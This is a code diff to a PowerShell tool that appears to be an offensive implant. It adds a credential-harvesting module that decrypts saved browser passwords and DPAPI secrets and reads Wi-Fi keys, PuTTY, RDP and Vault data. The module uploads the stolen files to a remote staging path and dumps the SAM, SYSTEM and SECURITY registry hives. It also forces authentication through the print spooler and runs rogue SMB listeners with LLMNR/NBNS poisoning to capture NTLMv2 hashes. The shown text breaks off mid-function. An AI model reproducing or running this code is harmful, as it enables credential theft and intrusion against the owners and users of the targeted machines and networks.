@@ -835,8 +835,933 @@ function Invoke-PersistRemoveAll {
     Remove-Item $_PERSIST_DIR -Force -Recurse -ErrorAction SilentlyContinue
 }
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# CREDENTIAL HARVESTING MODULE — harvest, sam, decrypt, coerce, listen
+# ═══════════════════════════════════════════════════════════════════════════════
+
+function _Creds-StageFile {
+    param([string]$FilePath, [string]$Label)
+    try {
+        if (-not (Test-Path $FilePath -ErrorAction SilentlyContinue)) { return $null }
+        $data = [IO.File]::ReadAllBytes($FilePath)
+        if ($data.Length -eq 0) { return $null }
+        $original = [IO.Path]::GetFileName($FilePath)
+        $fname = "creds_${Label}_${original}"
+        $hex = -join ((1..3) | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) })
+        $dest = "$FOLDER_PATH/staging/${fname}_${hex}"
+        $result = Invoke-TransportUploadBinary -Path $dest -Data $data
+        if ($null -ne $result) {
+            return @{ cloud_path = $dest; filename = $fname; source_path = $FilePath; size = $data.Length }
+        }
+    } catch {}
+    return $null
+}
+
+function _Creds-StageDirFiles {
+    param([string]$Dir, [string]$Prefix)
+    $results = @(); $count = 0; $bytes = 0
+    if (-not (Test-Path $Dir -PathType Container -ErrorAction SilentlyContinue)) { return @{ staged = $results; count = 0; bytes = 0 } }
+    foreach ($f in (Get-ChildItem -Path $Dir -File -ErrorAction SilentlyContinue)) {
+        $sf = _Creds-StageFile -FilePath $f.FullName -Label $Prefix
+        if ($sf) { $results += $sf; $count++; $bytes += $sf.size }
+    }
+    return @{ staged = $results; count = $count; bytes = $bytes }
+}
+
+function _Creds-FmtBytes {
+    param([long]$b)
+    if ($b -lt 1024) { return "$b B" }
+    elseif ($b -lt 1048576) { return "$([math]::Round($b/1024,1)) KB" }
+    else { return "$([math]::Round($b/1048576,1)) MB" }
+}
+
+function Invoke-CredsHarvest {
+    param([bool]$Decrypt = $false)
+    $out = "[creds harvest] Windows credential scan"
+    if ($Decrypt) { $out += " (decrypt: DPAPI decryption enabled)" }
+    $out += "`n"
+    $staged = @(); $sCount = 0; $sBytes = 0; $iCount = 0
+
+    $appdata      = $env:APPDATA
+    $localappdata = $env:LOCALAPPDATA
+    $userprofile  = $env:USERPROFILE
+
+    # ── DPAPI credential blobs ──
+    if ($Decrypt) {
+        $dpapiDecrypted = 0
+        foreach ($dir in @("$appdata\Microsoft\Credentials", "$localappdata\Microsoft\Credentials")) {
+            if (-not (Test-Path $dir -ErrorAction SilentlyContinue)) { continue }
+            foreach ($f in (Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue)) {
+                try {
+                    $enc = [IO.File]::ReadAllBytes($f.FullName)
+                    $plain = [Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')
+                    if ($plain -and $plain.Length -gt 0) {
+                        $text = [Text.Encoding]::Unicode.GetString($plain)
+                        if ($text.Length -gt 2) {
+                            if ($dpapiDecrypted -eq 0) { $out += "  --- DPAPI Credentials (decrypted) ---`n" }
+                            $out += "    $($f.Name): $($text.Substring(0, [Math]::Min(200, $text.Length)))`n"
+                            $dpapiDecrypted++
+                        }
+                    }
+                } catch {}
+            }
+        }
+        if ($dpapiDecrypted -gt 0) { $out += "  OK DPAPI: $dpapiDecrypted credential(s) decrypted -> inline`n"; $iCount += $dpapiDecrypted }
+        else { $out += "  X DPAPI blobs: none decryptable (different logon session?)`n" }
+    } else {
+        foreach ($dir in @("$appdata\Microsoft\Credentials", "$localappdata\Microsoft\Credentials")) {
+            $r = _Creds-StageDirFiles -Dir $dir -Prefix "dpapi_cred"
+            if ($r.count -gt 0) { $out += "  OK DPAPI blobs: $($r.count) files ($(_Creds-FmtBytes $r.bytes)) -> staged`n"; $sCount += $r.count; $sBytes += $r.bytes; $staged += $r.staged }
+        }
+    }
+
+    # DPAPI master keys
+    try {
+        $sid = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+        $mkPath = "$appdata\Microsoft\Protect\$sid"
+        $r = _Creds-StageDirFiles -Dir $mkPath -Prefix "dpapi_masterkey_$sid"
+        if ($r.count -gt 0) { $out += "  OK DPAPI master keys ($sid): $($r.count) files ($(_Creds-FmtBytes $r.bytes)) -> staged`n"; $sCount += $r.count; $sBytes += $r.bytes; $staged += $r.staged }
+    } catch {}
+
+    # ── Chrome / Edge ──
+    $browsers = @(
+        @{ Name = "Chrome"; Base = "$localappdata\Google\Chrome\User Data"; Prefix = "chrome" },
+        @{ Name = "Edge";   Base = "$localappdata\Microsoft\Edge\User Data"; Prefix = "edge" }
+    )
+    foreach ($br in $browsers) {
+        $loginPath = "$($br.Base)\Default\Login Data"
+        if (-not (Test-Path $loginPath -ErrorAction SilentlyContinue)) { $out += "  X $($br.Name): not found`n"; continue }
+        if ($Decrypt) {
+            $creds = _Creds-DecryptChromium -BasePath $br.Base -LoginPath $loginPath
+            if ($creds -and $creds.Count -gt 0) {
+                $out += "  --- $($br.Name) Passwords (decrypted) ---`n"
+                foreach ($c in $creds) { $out += "    $($c.url) | $($c.user) | $($c.pass)`n" }
+                $out += "  OK $($br.Name): $($creds.Count) password(s) decrypted -> inline`n"
+                $iCount += $creds.Count
+            } else {
+                $out += "  OK $($br.Name): database accessible but no saved passwords (or decrypt failed)`n"
+                $sf = _Creds-StageFile -FilePath $loginPath -Label $br.Prefix
+                if ($sf) { $sCount++; $sBytes += $sf.size; $staged += $sf }
+                $lsPath = "$($br.Base)\Local State"
+                $sf2 = _Creds-StageFile -FilePath $lsPath -Label $br.Prefix
+                if ($sf2) { $sCount++; $sBytes += $sf2.size; $staged += $sf2 }
+            }
+        } else {
+            $sf = _Creds-StageFile -FilePath $loginPath -Label $br.Prefix
+            if ($sf) { $out += "  OK $($br.Name) Login Data: ($(_Creds-FmtBytes $sf.size)) -> staged`n"; $sCount++; $sBytes += $sf.size; $staged += $sf }
+        }
+    }
+
+    # ── Firefox ──
+    $ffDir = "$appdata\Mozilla\Firefox\Profiles"
+    $ffCreds = _Creds-ParseFirefox -ProfilesDir $ffDir
+    if ($ffCreds -and $ffCreds.Count -gt 0) {
+        $out += "  --- Firefox Passwords ---`n"
+        foreach ($c in $ffCreds) { $out += "    $($c.url) | $($c.user) | $($c.pass)`n" }
+        $out += "  OK Firefox: $($ffCreds.Count) password(s) decrypted -> inline`n"
+        $iCount += $ffCreds.Count
+    } else {
+        if (Test-Path $ffDir -ErrorAction SilentlyContinue) {
+            $ffStaged = 0
+            foreach ($prof in (Get-ChildItem -Path $ffDir -Directory -ErrorAction SilentlyContinue)) {
+                foreach ($fn in @("logins.json", "key4.db", "key3.db")) {
+                    $fp = Join-Path $prof.FullName $fn
+                    $sf = _Creds-StageFile -FilePath $fp -Label "ff"
+                    if ($sf) { $ffStaged++; $sCount++; $sBytes += $sf.size; $staged += $sf }
+                }
+            }
+            if ($ffStaged -gt 0) { $out += "  OK Firefox: $ffStaged files -> staged`n" }
+            else { $out += "  X Firefox: not found`n" }
+        } else { $out += "  X Firefox: not found`n" }
+    }
+
+    # ── WiFi profiles ──
+    try {
+        $wifiProfiles = & netsh.exe wlan show profiles 2>$null
+        $profileNames = [regex]::Matches($wifiProfiles, 'All User Profile\s*:\s*(.+)') | ForEach-Object { $_.Groups[1].Value.Trim() }
+        $wifiCount = 0
+        foreach ($pn in $profileNames) {
+            $detail = & netsh.exe wlan show profile name="$pn" key=clear 2>$null
+            $keyMatch = [regex]::Match($detail, 'Key Content\s*:\s*(.+)')
+            if ($keyMatch.Success) {
+                if ($wifiCount -eq 0) { $out += "  --- WiFi Profiles ---`n" }
+                $out += "    $pn -> $($keyMatch.Groups[1].Value.Trim())`n"
+                $wifiCount++
+            }
+        }
+        if ($wifiCount -gt 0) { $out += "  OK WiFi: $wifiCount profile(s) -> inline`n"; $iCount += $wifiCount }
+    } catch {}
+
+    # ── PuTTY sessions ──
+    try {
+        $puttyKey = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
+        if (Test-Path $puttyKey -ErrorAction SilentlyContinue) {
+            $sessions = Get-ChildItem -Path $puttyKey -ErrorAction SilentlyContinue
+            if ($sessions.Count -gt 0) {
+                $out += "  --- PuTTY Sessions ---`n"
+                foreach ($s in $sessions) {
+                    $host_ = (Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue).HostName
+                    $user_ = (Get-ItemProperty $s.PSPath -ErrorAction SilentlyContinue).UserName
+                    $out += "    $($s.PSChildName) -> ${user_}@${host_}`n"
+                }
+                $out += "  OK PuTTY sessions -> inline`n"; $iCount++
+            }
+        }
+    } catch {}
+
+    # ── RDP files ──
+    $rdpDir = "$userprofile\Documents"
+    if (Test-Path $rdpDir -ErrorAction SilentlyContinue) {
+        $rdpFiles = Get-ChildItem -Path $rdpDir -Filter "*.rdp" -File -ErrorAction SilentlyContinue
+        $rdpN = 0
+        foreach ($rf in $rdpFiles) {
+            $sf = _Creds-StageFile -FilePath $rf.FullName -Label "rdp"
+            if ($sf) { $rdpN++; $sCount++; $sBytes += $sf.size; $staged += $sf }
+        }
+        if ($rdpN -gt 0) { $out += "  OK RDP: $rdpN file(s) -> staged`n" }
+    }
+
+    # ── Windows Vault ──
+    $vaultPath = "$localappdata\Microsoft\Vault"
+    $r = _Creds-StageDirFiles -Dir $vaultPath -Prefix "vault"
+    if ($r.count -gt 0) { $out += "  OK Windows Vault: $($r.count) files ($(_Creds-FmtBytes $r.bytes)) -> staged`n"; $sCount += $r.count; $sBytes += $r.bytes; $staged += $r.staged }
+
+    $out += "`n  Summary: $iCount inline, $sCount staged ($(_Creds-FmtBytes $sBytes) total)`n"
+    return @{ output = $out; staged = $staged }
+}
+
+function _Creds-DecryptChromium {
+    param([string]$BasePath, [string]$LoginPath)
+    $results = @()
+    try {
+        $lsFile = Join-Path $BasePath "Local State"
+        if (-not (Test-Path $lsFile -ErrorAction SilentlyContinue)) { return $results }
+        $lsJson = Get-Content $lsFile -Raw -ErrorAction Stop | ConvertFrom-Json
+        $encKeyB64 = $lsJson.os_crypt.encrypted_key
+        if (-not $encKeyB64) { return $results }
+        $encKeyRaw = [Convert]::FromBase64String($encKeyB64)
+        # Strip "DPAPI" prefix (5 bytes)
+        $dpapiBlob = $encKeyRaw[5..($encKeyRaw.Length - 1)]
+        $aesKey = [Security.Cryptography.ProtectedData]::Unprotect($dpapiBlob, $null, 'CurrentUser')
+
+        # Copy Login Data to temp (locked by Chrome)
+        $tmpDb = [IO.Path]::GetTempFileName()
+        Copy-Item $LoginPath $tmpDb -Force -ErrorAction Stop
+
+        # Read SQLite via shell (System.Data.SQLite not available by default)
+        Add-Type -AssemblyName System.Data -ErrorAction SilentlyContinue
+        $connStr = "Data Source=$tmpDb;Version=3;Read Only=True;"
+        $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr) -ErrorAction SilentlyContinue
+        if (-not $conn) {
+            Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
+            return $results
+        }
+        $conn.Open()
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND length(password_value) > 0"
+        $reader = $cmd.ExecuteReader()
+        while ($reader.Read()) {
+            $url  = $reader.GetString(0)
+            $user = $reader.GetString(1)
+            $enc  = [byte[]]$reader.GetValue(2)
+            if ($enc.Length -lt 15) { continue }
+            $pass = ""
+            if ($enc[0] -eq 0x76 -and $enc[1] -eq 0x31 -and $enc[2] -eq 0x30) {
+                # v10 AES-256-GCM: nonce(12) + ciphertext + tag(16)
+                $nonce = $enc[3..14]
+                $ct    = $enc[15..($enc.Length - 1)]
+                try {
+                    $gcm = [Security.Cryptography.AesGcm]::new($aesKey)
+                    $plain = [byte[]]::new($ct.Length - 16)
+                    $tag   = $ct[($ct.Length - 16)..($ct.Length - 1)]
+                    $cipher = $ct[0..($ct.Length - 17)]
+                    $gcm.Decrypt($nonce, $cipher, $tag, $plain)
+                    $pass = [Text.Encoding]::UTF8.GetString($plain)
+                    $gcm.Dispose()
+                } catch { $pass = "(decrypt error)" }
+            } else {
+                try { $pass = [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')) }
+                catch { $pass = "(DPAPI error)" }
+            }
+            if ($user -or $pass) { $results += @{ url = $url; user = $user; pass = $pass } }
+        }
+        $reader.Close(); $conn.Close(); $conn.Dispose()
+        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
+    } catch {}
+    return $results
+}
+
+function _Creds-ParseFirefox {
+    param([string]$ProfilesDir)
+    $results = @()
+    if (-not (Test-Path $ProfilesDir -ErrorAction SilentlyContinue)) { return $results }
+    foreach ($prof in (Get-ChildItem -Path $ProfilesDir -Directory -ErrorAction SilentlyContinue)) {
+        $loginsFile = Join-Path $prof.FullName "logins.json"
+        if (-not (Test-Path $loginsFile -ErrorAction SilentlyContinue)) { continue }
+        try {
+            $logins = Get-Content $loginsFile -Raw -ErrorAction Stop | ConvertFrom-Json
+            foreach ($l in $logins.logins) {
+                $results += @{ url = $l.hostname; user = $l.encryptedUsername; pass = "(encrypted)" }
+            }
+        } catch {}
+    }
+    return $results
+}
+
+function Invoke-CredsSam {
+    $out = "[creds sam] In-memory SAM extraction`n"
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        $out += "  X Error: requires SYSTEM or elevated Administrator privileges`n"
+        return @{ output = $out; staged = @() }
+    }
+    $out += "  Privilege: elevated OK`n"
+    $out += "  Method: reg.exe save + secretsdump`n"
+
+    $tmpDir = $env:TEMP
+    $samFile = "$tmpDir\s_$(Get-Random -Max 9999).tmp"
+    $sysFile = "$tmpDir\y_$(Get-Random -Max 9999).tmp"
+    $secFile = "$tmpDir\e_$(Get-Random -Max 9999).tmp"
+    try {
+        $psi = [Diagnostics.ProcessStartInfo]::new("reg.exe")
+        $psi.CreateNoWindow = $true; $psi.UseShellExecute = $false
+        $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
+
+        $psi.Arguments = "save HKLM\SAM `"$samFile`" /y"
+        $p = [Diagnostics.Process]::Start($psi); $p.WaitForExit(10000)
+        if (-not (Test-Path $samFile)) { throw "SAM save failed" }
+
+        $psi.Arguments = "save HKLM\SYSTEM `"$sysFile`" /y"
+        $p = [Diagnostics.Process]::Start($psi); $p.WaitForExit(10000)
+        if (-not (Test-Path $sysFile)) { throw "SYSTEM save failed" }
+
+        $psi.Arguments = "save HKLM\SECURITY `"$secFile`" /y"
+        $p = [Diagnostics.Process]::Start($psi); $p.WaitForExit(10000)
+
+        # Stage the hive files
+        $staged = @()
+        foreach ($item in @(@{p=$samFile;l="sam_hive"},@{p=$sysFile;l="system_hive"},@{p=$secFile;l="security_hive"})) {
+            if (Test-Path $item.p -ErrorAction SilentlyContinue) {
+                $sf = _Creds-StageFile -FilePath $item.p -Label $item.l
+                if ($sf) { $staged += $sf }
+            }
+        }
+        $out += "  OK $($staged.Count) hive(s) staged -> use secretsdump.py offline`n"
+        $out += "  Run: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`n"
+    } catch {
+        $out += "  X $($_.Exception.Message)`n"
+        $staged = @()
+    } finally {
+        # Cleanup temp hive files
+        foreach ($tf in @($samFile, $sysFile, $secFile)) {
+            if (Test-Path $tf -ErrorAction SilentlyContinue) { Remove-Item $tf -Force -ErrorAction SilentlyContinue }
+        }
+    }
+    return @{ output = $out; staged = $staged }
+}
+
+function Invoke-CredsCoerce {
+    $out = "[creds coerce] Named pipe coercion`n"
+    try {
+        # SpoolSample (MS-RPRN) — trigger local auth via Print Spooler
+        $pipeName = "stratum_$(Get-Random -Max 99999)"
+        $pipeServer = [IO.Pipes.NamedPipeServerStream]::new($pipeName, [IO.Pipes.PipeDirection]::InOut, 1, [IO.Pipes.PipeTransmissionMode]::Byte, [IO.Pipes.PipeOptions]::Asynchronous)
+        $ar = $pipeServer.BeginWaitForConnection($null, $null)
+
+        # Coerce via SpoolNotifyInfo — calls RpcRemoteFindFirstPrinterChangeNotification
+        $target = "\\.\pipe\$pipeName"
+        try {
+            $printApi = @"
+using System;
+using System.Runtime.InteropServices;
+public class SpoolCoerce {
+    [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
+    public static extern bool OpenPrinter(string pPrinterName, out IntPtr phPrinter, IntPtr pDefault);
+    [DllImport("winspool.drv", SetLastError=true)]
+    public static extern bool ClosePrinter(IntPtr hPrinter);
+    [DllImport("winspool.drv", CharSet=CharSet.Unicode, SetLastError=true)]
+    public static extern int FindFirstPrinterChangeNotification(IntPtr hPrinter, int fdwFilter, int fdwOptions, IntPtr pPrinterNotifyOptions);
+}
+"@
+            Add-Type -TypeDefinition $printApi -Language CSharp -ErrorAction SilentlyContinue
+            $hPrinter = [IntPtr]::Zero
+            [SpoolCoerce]::OpenPrinter("\\localhost", [ref]$hPrinter, [IntPtr]::Zero) | Out-Null
+            if ($hPrinter -ne [IntPtr]::Zero) {
+                [SpoolCoerce]::FindFirstPrinterChangeNotification($hPrinter, 0xFF, 0, [IntPtr]::Zero) | Out-Null
+                [SpoolCoerce]::ClosePrinter($hPrinter) | Out-Null
+            }
+        } catch {}
+
+        if ($ar.AsyncWaitHandle.WaitOne(5000)) {
+            try { $pipeServer.EndWaitForConnection($ar) } catch {}
+            $pipeServer.Dispose()
+            $out += "  OK SpoolSample (MS-RPRN) local coercion succeeded`n"
+            $out += "  Authentication was triggered on \\.\pipe\$pipeName`n"
+        } else {
+            $pipeServer.Dispose()
+            $out += "  X SpoolSample: no connection received (spooler may be disabled)`n"
+            $out += "  Tip: use '/creds listen start smb:445' + external coercion instead`n"
+        }
+    } catch {
+        $out += "  X SpoolSample failed: $($_.Exception.Message)`n"
+    }
+    return $out
+}
+
+# ── Credential Listeners (SMB / HTTP / LLMNR / NBNS) ──
+$script:_CredsListeners  = [System.Collections.ArrayList]::new()
+$script:_CredsPoisonStop = $null
+
+function _Creds-PollListeners {
+    foreach ($e in $script:_CredsListeners) {
+        if ($e.stop.WaitOne(0)) { continue }
+        $tcpL = $e.listener
+        $hashes = $e.hashes
+        $proto = $e.proto
+        $maxCheck = 5
+        while ($tcpL.Pending() -and $maxCheck -gt 0) {
+            $maxCheck--
+            try {
+                $client = $tcpL.AcceptTcpClient()
+                $client.ReceiveTimeout = 10000
+                $client.SendTimeout    = 10000
+                if ($proto -eq "http") {
+                    $cred = _Creds-HandleHttpClient -Client $client
+                } else {
+                    $cred = _Creds-HandleSmbClient -Client $client
+                }
+                if ($cred) {
+                    $dup = $false
+                    $dk = _Creds-DedupKey -Cred $cred
+                    foreach ($existing in $hashes) {
+                        if ((_Creds-DedupKey -Cred $existing) -eq $dk) { $dup = $true; break }
+                    }
+                    if (-not $dup -and $hashes.Count -lt 200) { [void]$hashes.Add($cred) }
+                }
+                try { $client.Close() } catch {}
+            } catch {}
+        }
+    }
+    _Creds-PollPoisoners
+}
+
+function Invoke-CredsListenStart {
+    param([int]$Port = 445, [string]$Proto = "smb")
+    if ([string]::IsNullOrEmpty($Proto) -or $Proto -eq "all") { $Proto = "smb" }
+    $key = "${Proto}:${Port}"
+
+    foreach ($e in $script:_CredsListeners) {
+        if ($e.key -eq $key) { return "[creds listen] $key already running" }
+    }
+
+    $stopFlag = [System.Threading.ManualResetEvent]::new($false)
+    $hashes   = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
+    $active   = [System.Collections.ArrayList]::new()
+    $failed   = [System.Collections.ArrayList]::new()
+
+    try {
+        $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
+        $listener.Start()
+        [void]$active.Add("${Proto}:${Port}".ToUpper())
+    } catch {
+        [void]$failed.Add("${Proto}:${Port} ($($_.Exception.Message))")
+    }
+
+    if ($active.Count -eq 0) {
+        return "[creds listen] Failed to bind ${Proto}:${Port} - $($failed -join ', ')"
+    }
+
+    [void]$script:_CredsListeners.Add(@{
+        key      = $key
+        port     = $Port
+        proto    = $Proto
+        started  = [DateTime]::UtcNow
+        stop     = $stopFlag
+        hashes   = $hashes
+        listener = $listener
+    })
+
+    _Creds-EnsurePoisoners -Active $active -Failed $failed
+
+    $msg = "[creds listen] Active: $($active -join ' + ')"
+    if ($failed.Count -gt 0) { $msg += "`n  Skipped: $($failed -join ', ')" }
+    return $msg
+}
+
+function Invoke-CredsListenStop {
+    param([string]$Spec = "all")
+    if ($script:_CredsListeners.Count -eq 0) {
+        return "[creds listen] No listeners running."
+    }
+    $stopped = 0; $totalHashes = 0
+    $toRemove = @()
+    foreach ($e in $script:_CredsListeners) {
+        if ($Spec -eq "all" -or $e.key -eq $Spec) {
+            $e.stop.Set()
+            try { $e.listener.Stop() } catch {}
+            $totalHashes += $e.hashes.Count
+            $toRemove += $e
+            $stopped++
+        }
+    }
+    foreach ($r in $toRemove) { $script:_CredsListeners.Remove($r) }
+    if ($script:_CredsListeners.Count -eq 0 -and $script:_CredsPoisonStop) {
+        $script:_CredsPoisonStop.Set()
+        $script:_CredsPoisonStop = $null
+        if ($script:_LlmnrSock) { try { $script:_LlmnrSock.Close() } catch {}; $script:_LlmnrSock = $null }
+        if ($script:_NbnsSock)  { try { $script:_NbnsSock.Close()  } catch {}; $script:_NbnsSock  = $null }
+    }
+    return "[creds listen] Stopped $stopped listener(s). $totalHashes credentials captured."
+}
+
+function Invoke-CredsListenDump {
+    if ($script:_CredsListeners.Count -eq 0) {
+        return "[creds listen] No listeners running. Use '/creds listen start' first."
+    }
+    $out = ""; $hasNtlm = $false
+    foreach ($e in $script:_CredsListeners) {
+        $elapsed = ([DateTime]::UtcNow - $e.started)
+        $dur = if ($elapsed.TotalHours -ge 1) { "{0}h {1}m" -f [int]$elapsed.TotalHours, $elapsed.Minutes }
+               elseif ($elapsed.TotalMinutes -ge 1) { "{0}m {1}s" -f [int]$elapsed.TotalMinutes, $elapsed.Seconds }
+               else { "{0}s" -f [int]$elapsed.TotalSeconds }
+        $label = $e.key.ToUpper()
+        $h = $e.hashes
+        if ($h.Count -eq 0) {
+            $out += "[$label] 0 credentials (active $dur)`n"
+        } else {
+            $basicN = ($h | Where-Object { $_.StartsWith("[HTTP-Basic]") }).Count
+            $ntlmN  = $h.Count - $basicN
+            if ($ntlmN -gt 0) { $hasNtlm = $true }
+            $out += "[$label] $($h.Count) credentials (active $dur) - $ntlmN NTLMv2 + $basicN Basic`n"
+            foreach ($hash in $h) { $out += "  $hash`n" }
+        }
+    }
+    $llmnr = if ($script:_LlmnrResponses) { $script:_LlmnrResponses } else { 0 }
+    $nbns  = if ($script:_NbnsResponses)  { $script:_NbnsResponses }  else { 0 }
+    $out += "`nPoisoned: $llmnr LLMNR, $nbns NBNS responses"
+    if ($hasNtlm) { $out += "`nNTLMv2 format: hashcat -m 5600" }
+    return $out
+}
+
+function _Creds-DedupKey {
+    param([string]$Cred)
+    if ($Cred.StartsWith("[HTTP-Basic]")) {
+        $idx = $Cred.IndexOf(" (from ")
+        if ($idx -gt 0) { return $Cred.Substring(0, $idx) }
+        return $Cred
+    }
+    # NTLMv2: user::domain:challenge:proof:blob -> user::domain
+    $dcIdx = $Cred.IndexOf("::")
+    if ($dcIdx -gt 0) {
+        $rest = $Cred.Substring($dcIdx + 2)
+        $colonIdx = $rest.IndexOf(":")
+        if ($colonIdx -gt 0) { return $Cred.Substring(0, $dcIdx + 2 + $colonIdx) }
+    }
+    return $Cred
+}
+
+function _Creds-HandleSmbClient {
+    param([System.Net.Sockets.TcpClient]$Client)
+    try {
+        $stream = $Client.GetStream()
+        $challenge = [byte[]]::new(8)
+        [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($challenge)
+
+        # Read negotiate
+        $msg = _Creds-SmbReadMsg -Stream $stream
+        if (-not $msg -or $msg.Length -lt 4) { return $null }
+
+        # SMB1 or SMB2 — respond with SMB2 either way
+        if ($msg[0] -eq 0xFE -and $msg[1] -eq 0x53) {
+            # SMB2
+        } elseif ($msg[0] -eq 0xFF -and $msg[1] -eq 0x53) {
+            # SMB1 — respond with SMB2 negotiate response directly
+        } else { return $null }
+
+        # Send SMB2 Negotiate Response
+        $negResp = _Creds-BuildSmb2NegResp
+        _Creds-SmbWriteMsg -Stream $stream -Data $negResp
+
+        # Read Session Setup 1 (NTLMSSP_NEGOTIATE)
+        $ss1 = _Creds-SmbReadMsg -Stream $stream
+        if (-not $ss1) { return $null }
+        $msgId = _Creds-Smb2MsgId -Msg $ss1
+
+        # Send NTLMSSP_CHALLENGE
+        $chalResp = _Creds-BuildSessionSetupChallenge -Challenge $challenge -MsgId $msgId
+        _Creds-SmbWriteMsg -Stream $stream -Data $chalResp
+
+        # Read Session Setup 2 (NTLMSSP_AUTH)
+        $ss2 = _Creds-SmbReadMsg -Stream $stream
+        if (-not $ss2) { return $null }
+        $hash = _Creds-ExtractNtlmv2 -Msg $ss2 -Challenge $challenge
+        if (-not $hash) { return $null }
+
+        # Send failure
+        $msgId2 = _Creds-Smb2MsgId -Msg $ss2
+        $failResp = _Creds-BuildSessionSetupFailure -MsgId $msgId2
+        _Creds-SmbWriteMsg -Stream $stream -Data $failResp
+
+        return $hash
+    } catch { return $null }
+}
+
+function _Creds-SmbReadMsg {
+    param($Stream)
+    $hdr = [byte[]]::new(4)
+    $read = $Stream.Read($hdr, 0, 4)
+    if ($read -lt 4) { return $null }
+    $len = ([int]$hdr[1] -shl 16) -bor ([int]$hdr[2] -shl 8) -bor [int]$hdr[3]
+    if ($len -gt 65535 -or $len -eq 0) { return $null }
+    $buf = [byte[]]::new($len)
+    $total = 0
+    while ($total -lt $len) {
+        $n = $Stream.Read($buf, $total, $len - $total)
+        if ($n -le 0) { return $null }
+        $total += $n
+    }
+    return $buf
+}
+
+function _Creds-SmbWriteMsg {
+    param($Stream, [byte[]]$Data)
+    $len = $Data.Length
+    $hdr = [byte[]]@(0x00, (($len -shr 16) -band 0xFF), (($len -shr 8) -band 0xFF), ($len -band 0xFF))
+    $Stream.Write($hdr, 0, 4)
+    $Stream.Write($Data, 0, $Data.Length)
+    $Stream.Flush()
+}
+
+function _Creds-Smb2MsgId {
+    param([byte[]]$Msg)
+    if ($Msg.Length -lt 32) { return [uint64]0 }
+    return [BitConverter]::ToUInt64($Msg, 24)
+}
+
+function _Creds-Smb2Header {
+    param([uint16]$Command, [uint32]$Status, [uint64]$MsgId, [uint64]$SessionId, [uint32]$Flags)
+    $h = [System.Collections.Generic.List[byte]]::new(64)
+    $h.AddRange([byte[]]@(0xFE, 0x53, 0x4D, 0x42))  # Protocol
+    $h.AddRange([BitConverter]::GetBytes([uint16]64))  # StructureSize
+    $h.AddRange([byte[]]@(0,0))                        # CreditCharge
+    $h.AddRange([BitConverter]::GetBytes($Status))
+    $h.AddRange([BitConverter]::GetBytes($Command))
+    $h.AddRange([BitConverter]::GetBytes([uint16]1))    # Credits
+    $h.AddRange([BitConverter]::GetBytes($Flags))
+    $h.AddRange([BitConverter]::GetBytes([uint32]0))    # NextCommand
+    $h.AddRange([BitConverter]::GetBytes($MsgId))
+    $h.AddRange([BitConverter]::GetBytes([uint32]0))    # Reserved
+    $h.AddRange([BitConverter]::GetBytes([uint32]0))    # TreeId
+    $h.AddRange([BitConverter]::GetBytes($SessionId))
+    $h.AddRange([byte[]]::new(16))                     # Signature
+    return $h.ToArray()
+}
+
+function _Creds-BuildSpnegoInit {
+    $ntlmOid = [byte[]]@(0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a)
+    $spnegoOid = [byte[]]@(0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02)
+    $mechType = [System.Collections.Generic.List[byte]]::new()
+    $mechType.Add(0x06); $mechType.Add([byte]$ntlmOid.Length); $mechType.AddRange($ntlmOid)
+    $mechTypes = [System.Collections.Generic.List[byte]]::new()
+    $mechTypes.Add(0x30); $mechTypes.Add([byte]$mechType.Count); $mechTypes.AddRange($mechType)
+    $mechCtx = [System.Collections.Generic.List[byte]]::new()
+    $mechCtx.Add(0xa0); $mechCtx.Add([byte]$mechTypes.Count); $mechCtx.AddRange($mechTypes)
+    $negInit = [System.Collections.Generic.List[byte]]::new()
+    $negInit.Add(0x30); $negInit.Add([byte]$mechCtx.Count); $negInit.AddRange($mechCtx)
+    $negCtx = [System.Collections.Generic.List[byte]]::new()
+    $negCtx.Add(0xa0); $negCtx.Add([byte]$negInit.Count); $negCtx.AddRange($negInit)
+    $inner = $spnegoOid.Length + $negCtx.Count
+    $spnego = [System.Collections.Generic.List[byte]]::new()
+    $spnego.Add(0x60)
+    if ($inner -lt 128) { $spnego.Add([byte]$inner) } else { $spnego.Add(0x81); $spnego.Add([byte]$inner) }
+    $spnego.AddRange($spnegoOid); $spnego.AddRange($negCtx)
+    return $spnego.ToArray()
+}
+
+function _Creds-BuildSmb2NegResp {
+    $secBuf = _Creds-BuildSpnegoInit
+    $pkt = [System.Collections.Generic.List[byte]]::new(256)
+    $pkt.AddRange((_Creds-Smb2Header -Command 0 -Status 0 -MsgId 0 -SessionId 0 -Flags 1))
+    $secOffset = [uint16]128
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]65))    # StructureSize
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]1))      # SecurityMode
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0x0202)) # Dialect SMB 2.0.2
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0))      # NegContextCount
+    $guid = [byte[]]::new(16); [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($guid)
+    $pkt.AddRange($guid)
+    $pkt.AddRange([BitConverter]::GetBytes([uint32]0))      # Capabilities
